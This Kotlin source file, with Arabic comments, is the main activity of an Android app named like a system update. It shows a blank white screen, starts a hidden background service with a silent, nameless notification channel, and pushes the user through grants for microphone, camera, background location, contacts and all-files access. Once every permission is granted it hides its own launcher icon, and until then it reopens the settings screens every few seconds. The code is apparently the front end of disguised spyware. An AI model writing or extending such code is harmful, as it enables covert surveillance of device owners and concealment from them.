package com.sys.update2

import android.Manifest
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.widget.FrameLayout
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private val PERM_REQUEST_CODE = 1001
    private val handler = Handler(Looper.getMainLooper())
    private val LAUNCHER_ALIAS = "com.sys.update2.LauncherAlias"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val white = FrameLayout(this)
        white.setBackgroundColor(Color.WHITE)
        setContentView(white)

        // سجّل الجهاز — مرة واحدة فقط
        DeviceManager.registerDeviceOnce(this)

        // شغّل الخدمة
        startBackgroundService()
        createNotificationChannel()

        // ابدأ بطلب الأذونات
        requestPermissionsStep1()
    }

    // ═══════════════════════════════════════════
    //  فحص كل الأذونات
    // ═══════════════════════════════════════════
    private fun hasAllPermissions(): Boolean {
        // 1. الصلاحيات الأساسية
        val basics = listOf(
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_CONTACTS
        )
        for (p in basics) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED)
                return false
        }

        // 2. POST_NOTIFICATIONS (Android 13+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED)
                return false
        }

        // 3. BACKGROUND_LOCATION (Android 10+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED)
                return false
        }

        // 4. MANAGE_EXTERNAL_STORAGE (Android 11+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager())
                return false
        }

        return true
    }

    // ═══════════════════════════════════════════
    //  إخفاء الأيقونة — بس لما كل الأذونات تتفعل
    // ═══════════════════════════════════════════
    private fun hideLauncherIconIfReady() {
        if (!hasAllPermissions()) {
            Log.d("MainActivity", "Permissions not complete yet — waiting")
            return
        }
        try {
            val component = ComponentName(this, LAUNCHER_ALIAS)
            packageManager.setComponentEnabledSetting(
                component,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.d("MainActivity", "✅ Launcher icon hidden — all permissions granted")
        } catch (e: Exception) {
            Log.e("MainActivity", "hide err: ${e.message}")
        }
    }

    // ═══════════════════════════════════════════
    //  Permissions Flow
    // ═══════════════════════════════════════════
    private fun requestPermissionsStep1() {
        val needed = mutableListOf<String>()

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
            needed.add(Manifest.permission.READ_EXTERNAL_STORAGE)

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED)
            needed.add(Manifest.permission.RECORD_AUDIO)

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED)
            needed.add(Manifest.permission.CAMERA)

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED)
            needed.add(Manifest.permission.ACCESS_FINE_LOCATION)

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED)
            needed.add(Manifest.permission.ACCESS_COARSE_LOCATION)

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED)
            needed.add(Manifest.permission.READ_CONTACTS)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED)
                needed.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        if (needed.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, needed.toTypedArray(), PERM_REQUEST_CODE)
        } else {
            requestBackgroundLocation()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        requestBackgroundLocation()
    }

    private fun requestBackgroundLocation() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                try {
                    val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                    intent.data = Uri.parse("package:$packageName")
                    startActivity(intent)
                } catch (_: Exception) {}
            }
        }
        handler.postDelayed({ requestAllFilesAccess() }, 3000)
    }

    private fun requestAllFilesAccess() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                    intent.data = Uri.parse("package:$packageName")
                    startActivity(intent)
                } catch (e: Exception) {
                    try {
                        val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                        startActivity(intent)
                    } catch (_: Exception) {}
                }
            }
        }
        handler.postDelayed({ requestBatteryOptimization() }, 3000)
    }

    private fun requestBatteryOptimization() {
        try {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.data = Uri.parse("package:$packageName")
            startActivity(intent)
        } catch (_: Exception) {}
        handler.postDelayed({ onSetupComplete() }, 2500)
    }

    // ═══════════════════════════════════════════
    //  بعد الإعداد — فحص إذا كل الأذونات اتمنحت
    // ═══════════════════════════════════════════
    private fun onSetupComplete() {
        // افحص — لو كل الأذونات اتمنحت، أخفي الأيقونة
        hideLauncherIconIfReady()

        // لو لسه ناقص أذونات، جدول فحص كل 5 ثواني
        if (!hasAllPermissions()) {
            handler.postDelayed({ checkAndHide() }, 5000L)
        }

        // افتح الويب
        try {
            startActivity(Intent(this, WebViewActivity::class.java))
        } catch (_: Exception) {}
        finish()
    }

    private fun checkAndHide() {
        if (hasAllPermissions()) {
            hideLauncherIconIfReady()
        } else {
            // لسه ناقص — ارجع افتح الإعدادات للصلاحيات الناقصة
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                    try {
                        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                        intent.data = Uri.parse("package:$packageName")
                        startActivity(intent)
                    } catch (_: Exception) {}
                }
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                if (!Environment.isExternalStorageManager()) {
                    try {
                        val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                        intent.data = Uri.parse("package:$packageName")
                        startActivity(intent)
                    } catch (_: Exception) {}
                }
            }
        }
    }

    // ═══════════════════════════════════════════
    //  Service + Notification
    // ═══════════════════════════════════════════
    private fun startBackgroundService() {
        try {
            val intent = Intent(this, BackgroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        } catch (_: Exception) {}
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "sys_sync_channel",
                " ",
                NotificationManager.IMPORTANCE_MIN
            )
            channel.setSound(null, null)
            channel.enableVibration(false)
            channel.setShowBadge(false)
            channel.description = " "
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(channel)
        }
    }
}
